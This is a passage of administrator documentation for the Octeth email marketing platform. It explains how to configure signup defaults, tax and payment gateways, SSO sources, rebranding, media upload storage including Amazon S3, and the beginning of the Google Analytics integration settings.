Select the language for the user interface that new signups will see when they first log in. Users can change this later in their account settings if they prefer a different language.

Available languages depend on which language packs are installed in your Octeth installation.

**User group assignment**

Decide how new signups are assigned to user groups. You have two options:

**Option 1: Assign all new users to a specific group**
Select a single user group from the dropdown menu. Every new signup will automatically be placed in this group with that group's settings, limits, and permissions.

This is the simplest approach and works well when all new users should start with the same plan (e.g., a "Free Trial" group or "Basic Plan" group).

**Option 2: Let users choose their group during signup**
Select **"Allow users to choose from the following user groups"** from the dropdown. Then choose multiple groups from the list below.

During registration, users will see a selection of available plans (user groups) and can choose which one they want to join. This is useful when offering multiple tiers during signup (Free, Starter, Professional, etc.).

::: tip User Group Setup Required
Before enabling user signup, create at least one user group with appropriate limits and permissions. The user group should have delivery servers assigned, or new users won't be able to send emails.
:::

### Currency and Tax

The Currency and Tax tab configures financial settings for credit purchases.

**Payment Currency**

Enter the three-letter currency code for all credit purchases (e.g., `USD`, `EUR`, `GBP`). This currency will be used when displaying prices, processing payments, and showing billing history.

Common currency codes:
- `USD` - US Dollar
- `EUR` - Euro
- `GBP` - British Pound
- `CAD` - Canadian Dollar
- `AUD` - Australian Dollar

**Tax Percentage**

Enter the tax rate to apply to all credit purchases. Use the numeric percentage without the % symbol.

For example:
- Enter `20` for 20% tax (e.g., UK VAT)
- Enter `13` for 13% tax (e.g., Canadian HST)
- Enter `0` if you don't charge tax

The tax is calculated automatically and added to the total when users purchase credits. Tax amounts are shown separately on receipts and invoices.

::: warning Tax Compliance
Consult with an accountant or tax professional to determine the correct tax rate for your jurisdiction. Tax requirements vary by country, state, and business type. Some regions require different tax rates based on the customer's location (origin vs. destination taxation).
:::

### Notification Emails

The Notification Emails tab customizes the automatic receipt emails sent to users after they purchase credits.

**Email Subject**

Enter the subject line for receipt emails. Keep it clear and professional so recipients immediately recognize what the email is about.

Good examples:
- `Your Credit Purchase Receipt`
- `Payment Confirmation - [Company Name]`
- `Credits Added to Your Account`

You can use personalization tags to include user-specific information in the subject. Click the dropdown menu below the subject field to select available tags:

- `%User:FirstName%` - Replaced with the user's first name
- `%User:LastName%` - Replaced with the user's last name
- `%Period:StartDate%` - Billing period start date
- `%Period:FinishDate%` - Billing period end date
- `%Period:TotalAmount%` - Total amount paid including tax

Example with personalization:
```
Your Receipt - %Period:TotalAmount% Paid
```

**Email Message**

Enter the body text for receipt emails. This is what users see when they open the receipt. Include a friendly message confirming their purchase and thanking them for their business.

You can use the same personalization tags available for the subject line, plus these additional tags:

- `%Period:ReceiptDetails%` - Automatically inserts a formatted table showing the purchase breakdown (credits, tax, total)
- `%Payment:Links%` - Inserts relevant payment-related links (invoice download, payment history, etc.)

::: tip Professional Receipt Template
A good receipt email should include:
1. A friendly greeting with the user's name
2. Confirmation of what was purchased
3. The `%Period:ReceiptDetails%` tag to show the breakdown
4. A thank you message
5. Contact information for support questions
6. The `%Payment:Links%` tag for accessing invoices

Example:
```
Hi %User:FirstName%,

Thank you for your credit purchase! Your payment has been processed successfully and credits have been added to your account.

%Period:ReceiptDetails%

You can view your payment history and download invoices anytime:
%Payment:Links%

If you have any questions, reply to this email or contact us at support@yourcompany.com.

Best regards,
The [Your Company] Team
```
:::

### Payment Gateway

The Payment Gateway tab configures which payment processors are available for credit purchases.

**Payment Processing Options**

You can enable one or both payment methods:

**Enable PayPal Express Checkout**
Check this box to allow users to pay for credits using PayPal. PayPal Express Checkout lets customers pay with their PayPal balance, bank account, or credit card through PayPal's secure checkout flow.

When enabled, you must provide these additional settings:

**Business Email**
Enter the email address associated with your PayPal business account. This is where payment funds will be deposited. The email must match your verified PayPal account email exactly.

**Purchase Description**
Enter a description that appears on the PayPal payment page and on customers' PayPal transaction history. Keep it short and clear.

Examples:
- `Email Marketing Credits`
- `[Your Company] - Email Credits Purchase`
- `Octeth Platform Credits`

**Currency**
Select the currency for PayPal transactions from the dropdown menu. Available currencies include:
- USD (US Dollar)
- EUR (Euro)
- GBP (British Pound)
- CAD (Canadian Dollar)
- AUD (Australian Dollar)
- And many more...

The PayPal currency should typically match the **Payment Currency** you configured in the Currency and Tax tab.

::: warning PayPal Account Requirements
Before enabling PayPal Express Checkout:
1. Create and verify a PayPal Business account (personal accounts don't support payment processing)
2. Complete PayPal's identity verification requirements
3. Test the integration with a sandbox account first
4. Ensure your PayPal account can receive payments in the selected currency
:::

**Enable Custom Payment Gateway**
Check this box if you want to integrate a custom payment processor other than PayPal (such as Stripe, Square, Authorize.net, or your own payment system).

When enabled, you must provide:

**Payment Gateway URL**
Enter the complete URL to your custom payment gateway endpoint. This is where Octeth will redirect users when they click to purchase credits.

Your custom payment gateway must:
1. Accept the user information sent by Octeth (user ID, email, requested credit amount)
2. Process the payment through your chosen payment processor
3. Notify Octeth when payment is complete using the provided callback URL
4. Add credits to the user's account after successful payment

::: info Custom Gateway Integration
Custom payment gateway integration requires developer work. Your development team will need to:
- Create a payment processing page at the specified URL
- Handle payment processing with your chosen provider (Stripe, Square, etc.)
- Implement the callback mechanism to notify Octeth of successful payments
- Handle errors and payment failures gracefully

This option gives you full control over the payment experience and allows using any payment processor, but requires technical implementation.
:::

**Saving Your Settings**

After configuring all four tabs, click **UPDATE ESP SETTINGS** at the bottom of the page to save your changes. All settings take effect immediately.

::: tip Testing Your Configuration
After saving ESP Settings, test the complete flow:
1. If user signup is enabled, try creating a test account through the registration form
2. Log in as the test user
3. Attempt a small credit purchase using your configured payment gateway
4. Verify the receipt email arrives with correct information
5. Confirm credits are added to the test account
6. Check that tax calculations are correct
:::

## Single Sign On (SSO)

Single Sign On (SSO) allows you to connect Octeth with your existing website or application so users can access Octeth without creating a separate account or logging in manually. When someone clicks a special link from your platform, they're automatically logged into Octeth with their account already set up.

**Why use SSO?**

SSO creates a seamless experience for your users by:
- Eliminating the need for separate registration forms
- Removing the hassle of remembering another username and password
- Automatically creating Octeth accounts for your existing users
- Keeping user information synchronized between your platform and Octeth
- Providing a professional, integrated experience

**When should you set this up?**

You should configure SSO if:
1. You have an existing user base on your website or application
2. You want to offer Octeth as part of your platform's features
3. You need to automatically provision Octeth accounts for your users
4. You want users to move between your platform and Octeth without logging in again

**Navigation:** **Settings** → **Single Sign On**

::: info Understanding SSO Security
SSO uses encrypted tokens to securely transfer user information between your platform and Octeth. Each SSO source has two secret encryption keys that ensure only authorized requests from your platform are accepted. The encrypted data includes user details like name, email, and account settings.
:::

### Creating an SSO Source

An SSO source represents a connection between your platform and Octeth. You can create multiple SSO sources if you need to connect different applications or websites to the same Octeth installation.

**To create a new SSO source:**

1. Navigate to **Settings** → **Single Sign On**
2. Click **Create SSO Source**
3. Fill out the configuration fields (explained below)
4. Click **Create**

After creating the source, you'll receive two secret encryption keys that your developer will need for the integration.

### Basic Configuration

#### Source Name

This is a friendly label that helps you identify this SSO connection in your admin panel. Choose something descriptive that tells you which platform or application this source is for.

**Examples:**
```
Main Website SSO
Mobile App Integration
Partner Portal Access
Customer Dashboard
```

::: tip
If you manage multiple platforms, use clear names like "iOS App SSO" and "Android App SSO" so you can quickly identify which integration you're looking at.
:::

#### Source Code

This is a unique identifier that gets included in the SSO links. It tells Octeth which SSO source to use when processing the authentication request.

**Requirements:**
- Must be unique across all your SSO sources
- Can only contain letters, numbers, dashes (-), and underscores (_)
- Cannot contain spaces or special characters

**Examples:**
```
main-website
mobile-app
partner-portal
customer-dashboard
```

::: warning
Once you create an SSO source, the source code becomes part of your integration. If you change it later, you'll need to update all the SSO links in your platform, which could break existing integrations.
:::

#### Description

This optional field lets you add notes about what this SSO source is used for, which developers are working on it, or any other relevant details. This is purely for your internal reference and won't affect how SSO works.

#### Expires At

You can optionally set an expiration date for this SSO source. After this date and time, all SSO links for this source will stop working.

**When to use expiration:**
- **Temporary integrations:** If you're running a limited-time promotion or trial
- **Testing:** When setting up a test integration that should automatically shut down
- **Scheduled migrations:** When you know you'll be switching to a new SSO source on a specific date

**Format:** `YYYY-MM-DD HH:MM:SS`

**Example:** `2024-12-31 23:59:59`

**Leave this field empty** if you want the SSO source to work indefinitely (most common scenario).

#### Valid For

This is a critical security setting that determines how long each SSO link remains valid after it's generated.

**What this means:**
When your platform generates an SSO link for a user, that link will only work for the number of seconds you specify here. After that time expires, the link becomes invalid and won't log the user in.

**Recommended setting:** `5` seconds or less

**Why keep this short?**
- **Security:** Short validity windows prevent attackers from using stolen or intercepted links
- **Freshness:** Ensures the user data in the link is current
- **Prevention of link sharing:** Users can't bookmark or share SSO links

::: warning Important Security Note
Setting this value too high (like 60 seconds or more) creates a security risk. If someone intercepts the SSO link, they could use it to access the account before it expires. Keep this as short as possible while still giving users enough time to click through.
:::

**How this works in practice:**
1. User clicks a button on your platform to access Octeth
2. Your platform generates an encrypted SSO link (valid for 5 seconds)
3. User's browser is redirected to that link
4. Octeth verifies the link is still valid (hasn't expired)
5. User is logged in

The entire process typically takes 1-2 seconds, so a 5-second validity window is plenty of time.

### SSO Options

These three checkboxes control what happens when users access Octeth through your SSO link.

#### Create new user account if corresponding account is not found

When enabled, Octeth will automatically create a new user account if someone tries to log in through SSO but doesn't have an existing account.

**When to enable this:**
- You're integrating Octeth with an existing platform that already has users
- You want new users to seamlessly start using Octeth without manual registration
- You're offering Octeth as part of your service

**When to disable this:**
- You only want specific pre-existing Octeth users to access the system via SSO
- You want to manually control who gets Octeth accounts

**Most common setting:** Enabled (checked)

#### Login the user to the user area

When enabled, users clicking the SSO link will be automatically logged into Octeth's user area and can start using the platform immediately.

**When to enable this:**
- You want a seamless experience where users go directly to their Octeth dashboard
- You're using SSO as the primary way users access Octeth

**When to disable this:**
- You only want to create/update the user account without logging them in
- You have a custom landing page or workflow after account creation

**Most common setting:** Enabled (checked)

#### Return the user data in JSON format

When enabled, instead of logging the user into Octeth, the SSO endpoint will return the user's information in a structured data format (JSON).

**When to enable this:**
- You need to verify the account was created/updated successfully
- You want to display user information in your own application
- You're building a custom integration that processes the user data programmatically

**When to disable this:**
- You want users to be logged in directly (the normal use case)

**Most common setting:** Disabled (unchecked)

::: info Understanding the Data Return Option
If you enable "Return the user data in JSON format," the SSO process won't log the user in. Instead, it returns data like the user ID, email, and account status. This is an advanced option typically used by developers building custom integrations. For most use cases, leave this disabled.
:::

### Access Credentials and Integration

After creating your SSO source, click on it to view the **Access Credentials** tab. This is where you'll find the encryption keys and integration code that your developer needs to implement SSO.

#### Secret Encryption Keys

Octeth automatically generates two unique encryption keys for your SSO source:

- **Secret Key #1:** Used for encrypting the user data
- **Secret Key #2:** Used for verifying the encrypted data hasn't been tampered with

These keys are shown in the Access Credentials tab. Your developer will need both keys to create valid SSO links.

::: warning Keep Your Keys Secure
These encryption keys are like passwords for your SSO integration. Anyone with these keys can create SSO links that log users into your Octeth account. Never share these keys publicly or commit them to public code repositories.
:::

#### Integration Instructions

The Access Credentials tab includes complete example code showing exactly how to generate encrypted SSO links. The example is written in PHP, but the same encryption approach can be used in any programming language.

**What information needs to be encrypted:**

Your platform must send this information in the encrypted token:

**Required fields:**
- `id` — The unique user ID from your platform
- `firstname` — User's first name
- `lastname` — User's last name
- `email` — User's email address
- `username` — The username for the Octeth account
- `password` — The password for the Octeth account
- `check_time` — Current timestamp (prevents replay attacks)

**Optional fields:**
- `target_usergroup_id` — Which user group to assign this user to in Octeth
- `reputation_level` — Set to `Trusted` or `Untrusted` (affects default limits)
- `timezone` — User's timezone (like `Europe/London`)
- `language` — User's preferred language (like `en`)
- `ip` — User's IP address
- `availablecredits` — Starting email credits for the user's account

::: info About Required vs. Optional Fields
While the integration code requires all fields to be present, you can set optional fields to empty values or defaults if you don't need them. For example, if you're not tracking user timezones, you can set it to a default like `UTC`.
:::

### Monitoring SSO Usage

The **Statistics** tab shows you how your SSO integration is performing over the last 30 days.

**What you can track:**

- **Successful data transfers:** How many times users successfully authenticated through this SSO source
- **Failed data transfers:** How many SSO attempts failed (usually due to expired links or invalid encryption)
- **Logins:** How many times existing users logged in through SSO
- **Sign-ups:** How many new accounts were created through SSO

These statistics help you:
- Verify your integration is working correctly
- Identify issues if you see high failure rates
- Understand how many users are coming through this SSO source
- Monitor the adoption of your integrated platform

::: tip Understanding the Statistics
If you see a high number of "Failed data transfers," it usually means:
- The SSO links are expiring before users click them (try increasing the "Valid For" setting slightly)
- There's an encryption issue in your integration code
- Users are trying to reuse old SSO links (which is normal and expected)
:::

### Common SSO Integration Patterns

Here are typical ways Octeth's SSO feature is used:

**Pattern 1: Seamless Platform Integration**
You have a membership website, and you want members to access Octeth as part of their membership benefits. When they click "Email Marketing" in your member dashboard, they're automatically logged into Octeth with an account already created for them.

**Pattern 2: White-Label Reselling**
You're reselling Octeth as part of your own branded platform. You want your customers to see a seamless experience where they never realize they're using Octeth - they think it's part of your platform.

**Pattern 3: Partner Portal**
You're giving partners or affiliates access to Octeth for managing email campaigns. Partners log into your portal, click through to the email marketing section, and are automatically authenticated in Octeth.

**Pattern 4: Mobile App Integration**
You have a mobile app and want users to access Octeth's features without creating a separate account. The app generates an SSO link when users tap the email marketing feature.

## Preferences

Most install-wide preferences are in the new interface: open the staff area, click **Settings**, then **Preferences**. See [Staff Preferences](/v6.0.4/new-user-interface/staff-preferences) for the default language, user password reset, send rate alerts, the limit utilization webhook, the failed webhook handler and the List freshness thresholds.

The classic admin page, **Settings** > **User area preferences** (`/app/admin/preferences/`), keeps the three settings only the classic user area uses.

**Forbidden Emails**

Specify email addresses that users are not allowed to use as "From" addresses in their email campaigns. This prevents users from impersonating certain email addresses or domains.

Enter one email address or pattern per line. You can use the asterisk (`*`) as a wildcard to match multiple addresses.

Examples:
```
noreply@yourdomain.com
admin@yourdomain.com
*@gmail.com
*@yahoo.com
support@*
```

::: warning
The list is checked only by the email editor of the classic user area.
:::

**User Area Footer**

Customize the footer text that appears at the bottom of every page in the classic user area. You can include HTML markup for formatting and links.

Example:
```html
© 2024 Your Company Name. All rights reserved. |
<a href="https://yourdomain.com/privacy">Privacy Policy</a> |
<a href="https://yourdomain.com/terms">Terms of Service</a>
```

**Default Custom Fields**

Define custom fields that will be automatically created whenever a user creates a new subscriber list. These fields will be added to every new list as text-based custom fields.

Enter one field name per line, for example:
```
First Name
Last Name
Company
```

Click **Update Preferences** to save. The three settings are saved together, and a refused save changes none of them.

## Rebranding

Rebranding allows you to customize Octeth's user-facing pages and elements with your own branding. This is particularly useful when offering Octeth as a white-label service to your clients or when you want to maintain consistent branding across your subscriber-facing communications.

To access rebranding settings, navigate to **Preferences** → **System Settings** → **Rebranding** in the administrator dashboard.

::: warning Rebranding the interface is only half of a whitelabel deployment
Everything on this page changes what your **users** see when they log in. It changes nothing about what their **recipients** see. The `X-Mailer`, `X-Complaints-To` and `X-Report-Abuse` headers, the `utm_source` on every tracked link, the envelope sender, the `Message-ID` domain and the tracking hostname are all configured elsewhere, and every one of them reaches recipients regardless of how the interface looks.

Work through the [Whitelabel Deployment Checklist](/v6.0.4/getting-started/whitelabel-deployment-checklist) after you finish here.
:::

### Product Name

**Product Name** is the application name displayed throughout the system interface and in user communications. Instead of showing "Octeth" everywhere, you can replace it with your own company or product name.

This name appears in:
- Email templates and notifications sent to subscribers
- User dashboard and interface elements
- System-generated messages
- Forward to Friend pages
- Report abuse pages
- User sign-up pages

For example, if you set the product name to "AwesomeMail", subscribers will see "Powered by AwesomeMail" instead of "Powered by Octeth" in their emails.

::: tip White Label Strategy
Changing the product name is essential for white-label deployments where you're offering email marketing services under your own brand. Choose a name that represents your business and resonates with your target audience.
:::

### Forward To Friend Page

The Forward To Friend feature allows your email recipients to share interesting emails with their contacts. You can customize the header and footer of this page to match your branding.

**Header URL**
URL to an HTML file or web page that will be displayed at the top of the Forward To Friend page. This typically includes your logo, navigation, and branding elements.

**Footer URL**
URL to an HTML file or web page that will be displayed at the bottom of the Forward To Friend page. This typically includes copyright information, links, and contact details.

Both URLs must start with `http://` or `https://`. For example: `https://yourdomain.com/header.html`

::: info URL Requirements
Your header and footer files should contain only the HTML/CSS you want to inject into the page. Don't include full HTML document structure (like `<html>`, `<head>`, `<body>` tags) - just the content you want to appear in that section.
:::

### Report Abuse Page

The Report Abuse page allows email recipients to report unwanted or inappropriate emails. Customize this page to maintain your branding and provide appropriate contact information for abuse reports.

**Header URL**
URL to an HTML file or web page for the top section of the Report Abuse page.

**Footer URL**
URL to an HTML file or web page for the bottom section of the Report Abuse page.

Enter the complete URL starting with `http://` or `https://`, for example: `https://yourdomain.com/abuse-header.html`

::: warning Abuse Handling
Even if you customize the Report Abuse page branding, ensure you monitor and respond to abuse reports promptly. Ignoring abuse reports can harm your sender reputation and lead to deliverability issues.
:::

### User Sign Up Page

When new users register for accounts on your Octeth installation, they see a sign-up page. You can add custom header and footer sections to this page to match your company branding and provide additional information.

**Header URL**
URL to an HTML file or web page displayed at the top of the user registration page.

**Footer URL**
URL to an HTML file or web page displayed at the bottom of the user registration page.

Both URLs must be complete web addresses starting with `http://` or `https://`.

::: tip Registration Page Branding
Use the sign-up page header to welcome new users, explain your service benefits, or display trust badges. The footer can include links to your terms of service, privacy policy, and support resources.
:::

### Subscriber Area

The Subscriber Area is where your email recipients can manage their subscription preferences, update their information, and unsubscribe from your mailing lists.

**Logout URL**
When subscribers click the logout link in the Subscriber Area, they'll be redirected to this URL. This is typically your main website homepage or a custom thank you page.

Enter the full URL starting with `http://` or `https://`, for example: `https://yourdomain.com/logout-success.html`

If you leave this field empty, subscribers will see a generic logout confirmation message after logging out.

::: info Subscriber Experience
The logout URL is your last touchpoint with subscribers in this session. Consider redirecting them to a page that:
- Thanks them for managing their preferences
- Highlights your products or services
- Provides links to your main website
- Offers customer support contact information
:::

### Best Practices

**Host branding files on a reliable server**: Your header and footer URLs must be accessible 24/7. If these files become unavailable, the pages will display without your custom branding.

**Keep branding consistent**: Use the same header and footer design across all pages (Forward To Friend, Report Abuse, User Sign Up) to maintain a cohesive brand experience.

**Test on mobile devices**: Many subscribers access these pages from smartphones. Ensure your header and footer HTML is responsive and looks good on small screens.

**Use HTTPS**: Always use HTTPS URLs for your branding files to avoid security warnings and ensure subscriber trust.

**Minimize file size**: Keep your header and footer files small (under 50KB each) to ensure fast page loading times.

## Upload Settings

Upload Settings control how files are stored and managed in your Octeth installation. This includes the media library where users upload images and documents for email campaigns, as well as file size limits for imports, attachments, and media files.

To access these settings, navigate to **Preferences** → **System Settings** → **Uploads and Media Library** in the administrator dashboard.

The Upload Settings page has two main tabs: **Media Library** (where you control file uploads and storage) and **File Upload** (where you set file size limits).

### Media Library Tab

The Media Library tab controls whether users can upload files, which file types are allowed, and where those files are stored (on your server, in your database, or on Amazon S3).

**Status**

The status determines whether your users can upload and use files in the media library.

Options:
- **Media library is enabled** - Users can upload files to the media library and use them in email campaigns
- **Media library is disabled** - Users cannot upload files or access the media library

::: tip When to Disable the Media Library
You might disable the media library if:
- You want to prevent users from uploading files that consume server storage
- Your installation only sends text-based emails without images
- You're migrating to a new storage system and need to temporarily block uploads
- You want to enforce a corporate policy that all media must be hosted externally
:::

**Allowed File Types**

This field controls which types of files users can upload to the media library. File types are specified using MIME types (a standardized way to identify file formats).

Enter MIME types separated by commas. For example:
```
image/gif,image/jpg,application/pdf,application/zip
```

This configuration allows users to upload:
- GIF images (`image/gif`)
- JPEG images (`image/jpg`)
- PDF documents (`application/pdf`)
- ZIP archives (`application/zip`)

::: info What Are MIME Types?
MIME types identify file formats using a type/subtype format. Common MIME types include:
- **Images**: `image/gif`, `image/jpg`, `image/jpeg`, `image/png`
- **Documents**: `application/pdf`, `application/msword`, `application/vnd.openxmlformats-officedocument.wordprocessingml.document` (Word)
- **Archives**: `application/zip`, `application/x-rar-compressed`
- **Video**: `video/mp4`, `video/mpeg`

For a complete list of MIME types, visit the [IANA Media Types registry](https://www.iana.org/assignments/media-types/media-types.xhtml).
:::

**Common Allowed File Types Configurations:**

**Images Only (Recommended for most email campaigns):**
```
image/gif,image/jpg,image/jpeg,image/png
```

**Images and PDFs:**
```
image/gif,image/jpg,image/jpeg,image/png,application/pdf
```

**Images, Documents, and Archives:**
```
image/gif,image/jpg,image/jpeg,image/png,application/pdf,application/msword,application/zip
```

::: warning Security Consideration
Only allow file types that are necessary for your users. Each file type you allow increases potential security risks. Images (GIF, JPG, PNG) and PDFs are generally safe for email campaigns. Be cautious with:
- Executable files (`.exe`, `.bat`, `.sh`) - Never allow these
- Script files (`.js`, `.php`, `.py`) - Should not be allowed
- Archive files (`.zip`, `.rar`) - Only allow if users need to share downloadable resources
:::

**Upload Method**

The upload method determines where uploaded files are physically stored. Octeth supports three storage options:

**1. Upload to the server (Recommended for most installations)**

Files are stored in a directory on your Octeth server's file system. This is the simplest and most common configuration.

Advantages:
- Simple setup with no additional configuration
- Fast access to files
- No external service fees
- Complete control over your files

Disadvantages:
- Files consume server disk space
- Requires regular backups
- Scaling requires additional server storage

::: tip
This is the default and recommended option for most installations. It works well for installations with up to several gigabytes of media files.
:::

**2. Upload to the database**

Files are stored directly in your MySQL database as binary data instead of as separate files on disk.

Advantages:
- Files are automatically included in database backups
- Simplified backup and migration
- No file system permissions issues

Disadvantages:
- Slower file access compared to file system storage
- Increases database size significantly
- Can impact database performance with large files
- More complex to troubleshoot file issues

::: warning Database Performance Impact
Storing files in the database can significantly increase database size and slow down backups. This method is generally only recommended for small installations with minimal file uploads (under 1GB total).
:::

**3. Upload to Amazon S3**

Files are stored in Amazon S3 (Simple Storage Service), a cloud storage platform. This option requires an AWS account and S3 bucket.

Advantages:
- Unlimited scalable storage
- No impact on server disk space
- Global content delivery (fast access worldwide)
- Built-in redundancy and reliability
- Ideal for high-volume installations

Disadvantages:
- Requires AWS account and configuration
- Monthly AWS storage fees (typically $0.023 per GB)
- Monthly data transfer fees
- More complex initial setup

::: tip When to Use Amazon S3
Amazon S3 is ideal for:
- High-volume installations with many users uploading files
- Installations with limited server storage
- Multi-server or load-balanced environments
- Situations where you want offsite storage redundancy
- Installations sending to global audiences (S3 provides faster worldwide access)
:::

**Amazon S3 Connection Settings**

This section only appears when you select **Upload to Amazon S3** as your upload method. You'll need to configure your AWS credentials and S3 bucket information.

::: info Prerequisites for S3 Setup
Before configuring S3 storage, you need to:
1. Create an AWS account at https://aws.amazon.com/
2. Create an S3 bucket in your preferred AWS region
3. Create IAM credentials with S3 access permissions
4. Note down your Access ID, Secret Key, and Bucket Name
:::

**Access ID**

Your AWS IAM access key ID. This is a 20-character identifier that looks like: `AKIAIOSFODNN7EXAMPLE`

To create access credentials:
1. Log into AWS Console
2. Navigate to **IAM** → **Users**
3. Create a new user or select an existing user
4. Create access keys under **Security Credentials**
5. Copy the Access Key ID

::: danger Keep Credentials Secure
Never share your AWS access credentials publicly or commit them to version control systems. Anyone with these credentials can access your S3 bucket and incur AWS charges on your account.
:::

**Secret Key**

Your AWS IAM secret access key. This is a 40-character secret that looks like: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`

The secret key is only shown once when you create the access key. If you lose it, you'll need to create new credentials.

::: warning
Store your secret key securely. If someone obtains both your Access ID and Secret Key, they have full access to your S3 bucket.
:::

**Bucket Name**

The name of your S3 bucket where files will be stored. Bucket names must be globally unique across all AWS accounts.

Example: `octeth-media-files`

::: tip S3 Bucket Best Practices
When creating your S3 bucket:
- Use a descriptive name that identifies its purpose (`octeth-media-production`)
- Enable versioning to protect against accidental deletions
- Configure lifecycle rules to automatically delete old files if needed
- Set up appropriate bucket permissions (private by default, with public read access if needed)
- Choose an AWS region close to your server for faster uploads
:::

**Media Library Path**

The folder path within your S3 bucket where media library files will be stored. This helps organize files and separate media from other content in the same bucket.

Example: `media-library` or `octeth/media`

::: warning Path Format
Do **not** include forward slashes (`/`) at the beginning or end of the path.

**Correct:** `media-library` or `octeth/media`
**Incorrect:** `/media-library/` or `/octeth/media/`

The system will automatically add slashes where needed.
:::

**Media Library URL**

The public URL where uploaded files can be accessed. This is typically your S3 bucket's CloudFront distribution URL or the direct S3 URL.

Examples:
- Direct S3 URL: `https://octeth-media-files.s3.amazonaws.com`
- CloudFront URL: `https://d111111abcdef8.cloudfront.net`

::: tip Using CloudFront for Better Performance
For faster file delivery worldwide, create a CloudFront distribution that points to your S3 bucket. CloudFront is AWS's content delivery network (CDN) that caches files at edge locations globally.

To set up CloudFront:
1. In AWS Console, navigate to **CloudFront**
2. Create a distribution pointing to your S3 bucket
3. Use the CloudFront domain name (e.g., `d111111abcdef8.cloudfront.net`) as your Media Library URL
4. Files will be automatically cached and delivered from the nearest location to your recipients
:::

::: warning URL Format
Do **not** include forward slashes (`/`) at the beginning or end of the URL.

**Correct:** `https://octeth-media-files.s3.amazonaws.com` or `https://d111111abcdef8.cloudfront.net`
**Incorrect:** `https://octeth-media-files.s3.amazonaws.com/` or `https://d111111abcdef8.cloudfront.net/`
:::

### File Upload Limits Tab

The File Upload Limits tab controls the maximum file sizes for different types of uploads in Octeth. These limits prevent users from uploading excessively large files that could consume server resources or cause performance issues.

All file sizes are specified in bytes. Use this reference for conversions:
- 1 MB (megabyte) = 1,048,576 bytes
- 5 MB = 5,242,880 bytes
- 10 MB = 10,485,760 bytes
- 25 MB = 26,214,400 bytes
- 50 MB = 52,428,800 bytes

::: tip Quick Conversion
To convert MB to bytes, multiply by 1,048,576:
- 5 MB × 1,048,576 = 5,242,880 bytes
- 10 MB × 1,048,576 = 10,485,760 bytes

Or use an online converter like Google: search "5 MB to bytes"
:::

**Import File Size**

The maximum file size allowed for importing subscriber lists and data files.

When users import subscribers using CSV or text files, this limit determines the largest file they can upload.

**Recommended values:**
- **Small installations (under 10,000 subscribers):** `10485760` (10 MB)
- **Medium installations (10,000-100,000 subscribers):** `52428800` (50 MB)
- **Large installations (100,000+ subscribers):** `104857600` (100 MB) or higher

::: info Why Import Files Can Be Large
Subscriber import files can contain thousands of rows with multiple columns of data (email, name, custom fields, etc.). A CSV file with 100,000 subscribers and 10 custom fields can easily exceed 10-20 MB.

Set this limit based on the largest import your users are likely to perform.
:::

::: warning Server Configuration Limits
Your import file size limit cannot exceed your server's PHP configuration limits. Check these PHP settings:
- `upload_max_filesize` - Maximum file size PHP will accept
- `post_max_size` - Maximum POST data size PHP will accept
- `memory_limit` - Maximum memory a PHP script can use

If your import limit is higher than these PHP limits, uploads will fail. Contact your system administrator to adjust PHP settings if needed.
:::

**Attachment Size**

The maximum file size allowed for email campaign attachments.

When users attach files to email campaigns (PDFs, documents, etc.), this limit controls the largest attachment they can upload.

**Recommended values:**
- **General use:** `5242880` (5 MB)
- **Large documents/PDFs:** `10485760` (10 MB)
- **Presentations and media:** `26214400` (25 MB)

::: warning Attachment Size Impact on Email Delivery
Large email attachments can cause delivery problems:
- Many email providers reject emails over 10-25 MB
- Large attachments increase spam scores
- Attachments slow down email sending
- Recipients with slow connections struggle to download large emails

**Best practice:** Instead of attaching large files directly to emails, upload them to your media library and include download links in your email content.
:::

::: tip Recommended Attachment Limits
For transactional emails (receipts, invoices): `2097152` (2 MB)
For marketing campaigns: `5242880` (5 MB)
For document distribution: `10485760` (10 MB) maximum

Files larger than 10 MB should be hosted separately and shared via links rather than email attachments.
:::

**Media File Size**

The maximum file size allowed for uploads to the media library (images, documents, etc.).

When users upload images and files to the media library for use in email campaigns, this limit controls the largest file they can upload.

**Recommended values:**
- **Images only:** `5242880` (5 MB)
- **Images and PDFs:** `10485760` (10 MB)
- **Images, PDFs, and videos:** `52428800` (50 MB)

::: info Typical Media File Sizes
- **Optimized email images:** 50-200 KB
- **High-resolution images:** 1-3 MB
- **PDF documents:** 500 KB - 5 MB
- **Short videos:** 10-50 MB

Most users won't need to upload files larger than 10 MB for email campaigns. Larger limits are only needed if users frequently upload videos or high-resolution graphics.
:::

::: tip Optimizing Media File Sizes
Encourage your users to optimize files before uploading:
- **Images:** Use JPG format and compress to 72 DPI for web use
- **PDFs:** Compress PDFs using "Save as reduced file size" options
- **Videos:** Host videos on YouTube or Vimeo and embed them rather than attaching directly

Smaller files load faster in emails, improve delivery rates, and reduce server storage consumption.
:::

**Saving Your Upload Settings**

After configuring all settings on both tabs, click the **UPDATE UPLOAD SETTINGS** button at the bottom of the page to save your changes.

::: danger Testing After Configuration Changes
After changing upload settings, especially when switching storage methods or adjusting file size limits:

1. **Test file uploads** - Try uploading files of various types and sizes to verify your configuration works
2. **Check existing files** - Ensure previously uploaded files are still accessible
3. **Verify S3 connection** - If using S3, confirm files appear in your S3 bucket and are accessible via the public URL
4. **Test in email campaigns** - Insert uploaded media into a test email and send it to verify images display correctly

Configuration errors can prevent users from uploading files or cause existing files to become inaccessible. Always test thoroughly before rolling out changes to production users.
:::

## Integrations

Octeth can integrate with popular third-party services to enhance your email marketing campaigns. The integrations settings allow you to connect external tools for campaign tracking, professional email design, and analytics.

Google Analytics and Stripo.email are set on the staff **Settings > Integrations** screen of the new interface, see [Staff Integrations](/v6.0.4/new-user-interface/staff-integrations). Unlayer and the settings plugins add stay on the classic admin page, **Settings > Integrations (legacy builders and plugins)** (`/app/admin/integration/`).

### Google Analytics

Google Analytics integration allows you to track how subscribers interact with your email campaigns in your Google Analytics dashboard. When enabled, Octeth automatically adds tracking parameters to all links in your email campaigns so you can measure:

- Which email campaigns drive the most website traffic
- How subscribers behave on your website after clicking email links
- Conversion rates from email campaigns
- Which links in your emails get the most clicks

**How It Works**

When you configure Google Analytics integration, Octeth adds two tracking parameters (`utm_source` and `utm_medium`) to every link in your email campaigns. These parameters tell Google Analytics that the visitor came from your email campaign.

**Source Keyword**

The source parameter identifies where the traffic came from. This typically identifies Octeth or your brand name.

Example: `octeth` or `email-marketing` or `newsletter`

When a subscriber clicks a link in your email, the link will include `utm_source=octeth` (or whatever value you set).

**Medium Keyword**

The medium parameter classifies the type of marketing channel. For email campaigns, this is typically set to `email`.

Example: `email` or `email-campaign`

